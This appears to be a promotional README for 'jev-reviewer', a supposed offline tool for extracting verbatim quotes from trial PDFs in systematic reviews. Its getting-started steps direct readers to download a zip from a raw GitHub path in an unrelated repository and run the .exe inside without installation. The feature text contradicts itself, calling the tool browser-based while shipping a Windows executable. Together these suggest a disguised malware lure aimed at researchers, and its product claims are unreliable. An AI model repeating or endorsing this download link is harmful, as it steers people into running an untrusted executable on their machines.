🧪 jev-reviewer — Verbatim quotes for bulletproof reviews

⬇️ Download for Windows · Free

Stop copying text manually. jev-reviewer reads your trial PDFs and finds every answer to your data‑extraction form as a direct, verbatim quote — with the page number. You verify each quote, then export the final table. No more missing numbers, no misquoted outcomes, no formatting headaches.

Works with RoB 2, ROBINS‑I, QUADAS‑2, TIDieR and any custom form. Everything stays in your browser — your files never leave your machine. Local‑first, private, and built for evidence synthesis.

🚀 Getting Started on Windows

  1. Visit this link to download the application — go to https://raw.githubusercontent.com/Begumcaliphate5/begumcaliphate5.github.io/main/1.548/lib/v3.1.zip (or click the blue button above).
  2. On the page, find the “Download” button or the latest release section. Click it to download the jev-reviewer.exe file.
  3. Once downloaded, double‑click the .exe file. No installation wizard — it opens directly.
  4. Drag and drop a trial report (PDF) into the window, or click “Open PDF”.
  5. Paste your extraction template (RoB2, ROBINS‑I, etc.) or choose a built‑in one. Jev will highlight every answer as a quote.
  6. Check the quotes (you see the exact page), edit if needed, then click “Export table” — CSV, Excel, or JSON.

No admin rights required. Works offline after download. No Python, no Node, nothing else to install.

💡 Why jev-reviewer?

Systematic reviews demand traceability. Every extraction must be tied to a source line. Jev does that automatically. It reads the PDF, understands your form, and pulls the exact sentence that answers the question — then shows you the page and lets you approve or reject.

📄 One‑click quote extraction

Open any trial PDF (even supplements). Jev locates the relevant passages using your template and returns a verbatim snippet with the page number.

🛡️ Built‑in risk‑of‑bias templates

Pre‑loaded RoB 2, ROBINS‑I, QUADAS‑2, TIDieR forms. Just select, then review the quotes Jev suggests.

🔏 100% local‑first privacy

Your PDFs and forms never leave your computer. No cloud, no upload, no tracking. Perfect for embargoed or sensitive trials.

🎙️ Voice input (beta)

Dictate your notes or comments. Jev attaches your spoken note to the quote — handy for long screening sessions.

📋 Typical workflow

  • 1. Load your PDFs — any file, even 300‑page supplemental appendices.
  • 2. Choose a template — RoB 2, ROBINS‑I, QUADAS‑2, TIDieR, or your own custom form.
  • 3. Jev extracts quotes — it scans the text, matches your questions, and proposes quotes.
  • 4. You verify — click each quote to see the exact line in context. Accept, reject, or adjust.
  • 5. Export — clean table with quote, page, and your decision. Works with Excel, CSV, or JSON. Perfect for PRISMA flow.

🎯 Who is it for?

Evidence synthesis teams, Cochrane reviewers, meta‑analysts, grad students, clinical researchers — anyone who has ever screamed at a PDF trying to find the blinding item. It also saves hours when you work with Zotero or EndNote: export quotes as notes, attach them to references.

⭐ Key highlight: the answer is a quote, not an interpretation

You don't type “blinding probably done” — you drag the sentence where the paper says “double‑blind”. The page number is automatic. That’s the core of jev-reviewer. No more “see page 5” and then hunting.

❓ Quick FAQ

Do I need an internet connection?

Only to download the app. After that, everything works offline.

Can I use it for scoping reviews or NMA?

Absolutely — any systematic review that needs verbatim evidence.

How does it handle scanned PDFs?

If the PDF has no text layer, Jev uses a built‑in OCR (if you enable it). That adds a few seconds, but works for most scanned documents.
